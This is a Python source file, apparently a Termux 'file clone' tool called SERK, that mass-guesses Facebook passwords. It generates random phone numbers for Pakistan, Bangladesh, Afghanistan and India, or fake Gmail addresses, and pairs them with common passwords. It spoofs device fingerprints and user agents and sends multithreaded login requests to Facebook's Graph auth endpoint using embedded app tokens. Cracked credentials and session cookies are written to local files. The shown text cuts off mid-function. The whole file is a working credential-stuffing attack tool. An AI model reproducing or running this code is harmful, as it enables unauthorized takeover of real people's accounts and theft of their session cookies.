ua = ["Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36"]
# ==================== USER AGENT POOL ====================
ugen = []

# ---- SAMSUNG (1000 dynamic UAs, 8 popular models) ----
for _ in range(1000):
    android_ver = random.choice(['10','11','12','13','14'])
    chrome_ver = str(random.randint(130, 150))
    model = random.choice(['SM-G960F','SM-G973F','SM-G991B','SM-A536B','SM-A346B','SM-A145F','SM-M336B','SM-E236B'])
    build = f"QP1A.{random.randint(190000, 220000)}.{random.randint(1, 99)}"
    samsung = f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver}.0.{random.randint(7000,7800)}.{random.randint(100,200)} Mobile Safari/537.36"
    ugen.append(samsung)

# ---- NOKIA (1000 dynamic UAs, 5 popular models) ----
for _ in range(1000):
    android_ver = random.choice(['10','11','12','13'])
    chrome_ver = str(random.randint(130, 150))
    model = random.choice(['Nokia 1 Plus','Nokia 2.4','Nokia 5.4','Nokia G10','Nokia C12 Pro'])
    nokia = f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/RP1A.{random.randint(200000, 220000)}.{random.randint(1, 99)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{random.randint(7400, 7800)}.{random.randint(100, 200)} Mobile Safari/537.36"
    ugen.append(nokia)

# ---- VIVO (1000 dynamic UAs, 7 popular models) ----
for _ in range(1000):
    android_ver = random.choice(['10','11','12','13'])
    chrome_ver = str(random.randint(80, 150))
    model = random.choice(['V1962BA','V2050','V2134','V2156','V2246','V2330','Y21'])
    vivo = f"Mozilla/5.0 (Linux; Android {android_ver}; {model}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver}.0.{random.randint(4000, 4500)}.{random.randint(100, 200)} Mobile Safari/537.36 VivoBrowser/{random.randint(8,15)}.{random.randint(0,9)}.{random.randint(0,15)}.0"
    ugen.append(vivo)

# ---- INFINIX (1000 dynamic UAs, 6 popular models) ----
for _ in range(1000):
    android_ver = random.choice(['10','11','12','13'])
    chrome_ver = str(random.randint(130, 150))
    model = random.choice(['Infinix X695','Infinix X6710','Infinix X6812','Infinix Hot 12','Infinix Note 12','Infinix Smart 7'])
    infinix = f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/RP1A.{random.randint(200000, 220000)}.{random.randint(1, 99)}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver}.0.{random.randint(7600, 7800)}.{random.randint(100, 200)} Mobile Safari/537.36"
    ugen.append(infinix)

# ---- IPHONE (1000 dynamic UAs) ----
for _ in range(1000):
    ios = random.choice(['17','18','19'])
    safari = random.choice(['604.1','605.1.15'])
    iphone = f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios}_{random.randint(0,8)}_{random.randint(0,8)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(16,26)}.0 Mobile/15E148 Safari/{safari}"
    ugen.append(iphone)

# ---- WINDOWS (1000 dynamic UAs) ----
for _ in range(500):
    firefox = str(random.randint(120, 140))
    windows = f"Mozilla/5.0 (Windows NT 10.0; Win32; x32; rv:{firefox}.0) Gecko/20100101 Firefox/{firefox}.0 | Screen:{random.randint(1300,1920)}x{random.randint(700,1080)} | Window:{random.randint(1000,1600)}x{random.randint(600,900)}"
    ugen.append(windows)

# Total: 6000 dynamic UAs across 26+ models
#try:
 #   proxies = random.choice(['https://raw.githubusercontent.com/TheSpeedX/socks-list/master/socks5.txt'])
#except:
#    pass
#=========================================================
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Telenor'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Telenor"
                        sim_id+=fbcr
        else:
                fbcr = 'Telenor'
                sim_id+=fbcr
except:
        fbcr = "Telenor"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

# ========== ORGANIZED COLOR SYSTEM ==========

# ---- Standard ANSI ----
bb  = "\033[1;30m"    # Dark Grey (progress bars)
BB  = "\033[1;31m"    # Bold Red (brackets, errors)
H   = "\033[1;32m"    # Bold Green (success)
K   = "\033[1;33m"    # Bold Yellow (highlights)
B   = "\033[1;34m"    # Bold Blue (info)
U   = "\033[1;35m"    # Bold Magenta (accent)
C   = "\033[1;36m"    # Bold Cyan (CP messages)
P   = "\033[1;37m"    # Bold White (general text)

# ---- Extended 256-Color ----
R   = '\x1b[38;5;46m'       # Bright Green (logo, OK messages)
XX  = '\x1b[38;5;196m'      # Bright Red (logo brackets, warnings)
GGG = '\x1b[38;5;214m'      # Gold/Amber (logo borders)
G   = '\x1b[1;95m'          # Bold Magenta (logo accent, labels)
WW  = '\033[1;97m'          # Bright White (high-emphasis text)
RST = '\033[0m'             # Full reset

# ---- Specific Use Colors ----
RED    = '\033[1;91m'       # Error messages in menu
PURPLE = '\x1b[38;5;93m'    # File path prompts
#=================================================

logo=(f"""
{GGG}╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗{RST}
{GGG}║{RST}   {R}.d8888.  d88888b d8888b. db   dD{RST}     {GGG}║{RST}
{GGG}║{RST}   {R}88'  YP  88'     88  `8D 88 ,8P'{RST}     {GGG}║{RST}
{GGG}║{RST}   {R}`8bo.    88ooooo 88oobY' 88,8P  {RST}     {GGG}║{RST}
{GGG}║{RST}   {R}  `Y8b.  88ooooo 88`8b   88`8b  {RST}     {GGG}║{RST}
{GGG}║{RST}   {R}db   8D  88.     88 `88. 88 `88.{RST}     {GGG}║{RST}
{GGG}║{RST}   {R}`8888Y'  Y88888P 88   YD YP   YD{RST}     {GGG}║{RST}
{GGG}╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝{RST}
{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RST}
{G} {XX}[{RST}{G}◈{XX}]{R} 0xAUTHOR : SERK{RST}
{G} {XX}[{RST}{G}◈{XX}]{R} FACEBOOK : MAHDI{RST}
{G} {XX}[{RST}{G}◈{XX}]{R} TOOLS    : FILE CLONE       V : 1.6{RST}
{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RST}""")
def linex():
    print(f'{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def clear():
        os.system('clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
clear()
def menu():
        try:
                x = ("***")
                if x == ("***"):
                        print(f'{H} {XX}[{G}1{XX}]{R} CRACK FILE ')
                        print(f'{H} {XX}[{G}2{XX}]{R} RANDOM CRACK ')
                        print(f'{H} {XX}[{G}0{XX}]{R} EXIT ')
                        linex()
                        xd=input(f'{G} CHOOSE A OPTION: ')
                        #os.system('xdg-open ')
                        if xd in ['1','01']:
                                clear()
                                
                                print(f'{PURPLE} PUT FILE EXAMPLE :  /sdcard/File.SERK.etc..')
                                linex()
                                file = input(f'{G} PUT FILE PATH\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' FILE NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{H} {XX}[{G}1{XX}]{R} METHOD (1)')
                                print(f'{H} {XX}[{G}2{XX}]{R} METHOD (2)')
                                print(f'{H} {XX}[{G}3{XX}]{R} METHOD (3)')
                                linex()
                                mthd=input(f'{G} CHOOSE : ')
                                linex()
                                clear()
                                plist = []
                                try:
                                        ps_limit = int(input(f'{BB} HOW MANY PASSWORDS DO YOU WANT ? '))
                                except:
                                        ps_limit =1
                                linex()
                                clear()
                                print(f'{RED} EXAMPLE : first last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f'{G} PUT PASSWORD {i+1}: '))
                                linex()
                                clear()
                                print(f'{G} DO YOU WANT TO SHOW COOKIES :? (Y/N): ')
                                linex()
                                cx=input(' CHOOSE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        
                                        print(f'{H} METHOD : {H} M{mthd}')
                                        print(f'{H} CRACKING STARTED...{H}')
                                        print(f'{H} TOTAL ACCOUNT : {H}' + total_ids + f' ')
                                        print(f'{K} NOTE! USE DATA AND AEROPLANE MODE{P}')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(nxn1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(nxn2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(nxn3,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(f'{R}[{XX}•{R}] THE PROCESS HAS COMPLETED')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(f'{G} {XX}[{G}⍣{XX}]{R} PRESS ENTER TO BACK ')
                                os.system('python SERK.py')
                        elif xd in ['2','02']:
                                clear()
                                print(f'{G} {XX}[{G}1{XX}]{R} Pakistan cloning\n {G}{XX}[{G}2{XX}]{R} Bangladesh cloning\n {G}{XX}[{G}3{XX}]{R} Afghanistan cloning\n {G}{XX}[{G}4{XX}]{R} India cloning\n {G}{XX}[{G}0{XX}]{R} Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        afg()
                                elif x in ['4','04']:
                                        ind()        
                                elif x in ['5','05']:  
                                        gmail()      
                                else:
                                        menu()
                        elif xd in ['0','00']:
                                exit()
                        
        except requests.exceptions.ConnectionError:
                print('\n NO INTERNET CONNECTION ...')
                exit()
def pak():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 0306,0310,0322,0345')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;31m EXAMPLE : 2000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as TRT:     
                        clear()
                        
                        tl = str(len(user))
                        print('[+] Total accounts: \033[1;97m'+tl)
                        print('[+] Process has been started \033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','pak12345','khan12345']
                                TRT.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python SERK.py')
def bd():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 017,016,018')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as TRT:     
                        clear()
                        
                        tl = str(len(user))
                        print('[+] Total accounts: \033[1;97m'+tl)
                        print('[+] Process has been started \033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','59039200','57273200']
                                TRT.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python SERK.py')

def afg():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 9377,9379,9374')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as TRT:     
                        clear()
                        
                        tl = str(len(user))
                        print('[+] Total accounts: \033[1;97m'+tl)
                        print('[+] Process has been started \033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                TRT.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python SERK.py')
def ind():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 91***,etc')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as TRT:     
                        clear()
                        
                        tl = str(len(user))
                        print('[+] Total accounts: \033[1;97m'+tl)
                        print('[+] Process has been started \033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','hindustan']
                                TRT.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python SERK.py')
                
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as ZAIN:
                        total = str(len(fo))
                        clear()
                        print(' Total account : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208mUse Airplane mode for speed\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                ZAIN.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python SERK.py')
                
#=============================API method=======================================
def nxn1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r\r{H} [SERK-M1] %s|{G}OK:-%s {H}'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China','Telenor'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/AndroidSampleApp;FBAV/148.0.051.62;FBLC/id_ID;FBBV/4084560;FBCR/Telkomsel;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=375,height=812};FB_FW/1;]','[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/453370252;FBDM/{density=3.0,width=1080,height=2156};FBLC/it_IT;FBRV/455160500;FBCR/FASTWEB;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2065;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/453370252;FBDM/{density=3.0,width=1080,height=2156};FBLC/it_IT;FBRV/455160500;FBCR/FASTWEB;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2065;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505401;FBDM/{density=1.75,width=720,height=1464};FBLC/de_DE;FBRV/283611169;FBCR/o2-de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A426B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/233.0.0.36.117;FBBV/166104954;FBDM/{density=2.0,width=720,height=1344};FBLC/es_LA;FBRV/167107722;FB_FW/2;FBCR/Movistar;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(6) play;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/es_MX;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]','[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=3.0,width=1080,height=2139};FBLC/es_LA;FBRV/0;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX3;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        API_KEYS = [
    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
    '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',
    '6628568379|c1e620fa708a1d5696fb991c1bde5662',
    '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae',
    '1348564698517390|007c0a9101b9e1c8ffab72666805038'
]

                        accessToken = random.choice(API_KEYS)
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        head = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'pt_BR','client_country_code': 'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print(f'\r\r {H}[SERK-M1-OK] {ids} | {pas}{P}')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SERK-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SERK-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print(f'\r\r {U}[SERK-M1-2F] {ids} | {pas}{P}')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r {C}[SERK-M1-CP] {ids} | {pas}{P}')
                                                open('/sdcard/SERK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SERK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#========================================
API_KEYS = [
    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
    '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',
    '6628568379|c1e620fa708a1d5696fb991c1bde5662',
    '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae',
]

API_KEYS_AUTH = [
    '256002347743983|374e60f8b9bb6b8cbb30f78030438895',
    'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
]
#========================================

API_KEYS_DATA = [
    '882a8490361da98702bf97a021ddc14d',
    '62f8ce9f74b12f84c123cc23437a4a32',
]

SIGS = [
    'eb2c67d09c80f92abadcb7adaefa8ffc',
    '62f8ce9f74b12f84c123cc23437a4a32',
]
#=============================API method=======================================
def nxn2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r\r{H} [SERK-M2] %s|{H}OK:-%s {H}'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = random.choice(API_KEYS)
                        data = {
                                'adid': adid,
                                'format': 'json',
                                'device_id': device_id,
                                'email': ids,
                                'password': pas,
                                'generate_analytics_claims': '1',
                                'community_id': '',
                                'cpl': 'true',
                                'try_num': '1',
                                'family_device_id': family,
                                'session_id': str(uuid.uuid4()),
                                'advertiser_id': str(uuid.uuid4()),
                                'reg_instance': str(uuid.uuid4()),
                                'logged_out_id': str(uuid.uuid4()),
                                'credentials_type': 'password',
                                'source': 'login',
                                'error_detail_type': 'button_with_disabled',
                                'enroll_misauth': 'false',
                                'generate_session_cookies': '1',
                                'generate_machine_id': '1',
                                'currently_logged_in_userid': '0',
                                'locale': random.choice(['pt_BR', 'en_US', 'en_GB', 'vi_VN', 'bn_IN', 'es_LA', 'id_ID']),
                                'client_country_code': random.choice(['BR', 'US', 'GB', 'VN', 'IN', 'MX', 'ID']),
                                'omit_response_on_success': 'false',
                                'tier': random.choice(['regular', 'daily']),
                                'fb_api_req_friendly_name': 'authenticate',
                                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                                'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
                                'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
                                'access_token': accessToken,
                                'api_key': random.choice(API_KEYS_DATA),
                                'sig': random.choice(SIGS),
                        }
                        headers = {
                                'User-Agent': random.choice(ugen_app),
                                'Authorization': random.choice(API_KEYS_AUTH),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-Connection-Bandwidth': str(random.randint(5000000, 50000000)),
                                'X-FB-Connection-Quality': 'EXCELLENT',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Friendly-Name': 'authenticate',
                                'Content-Type': 'application/x-www-form-urlencoded',
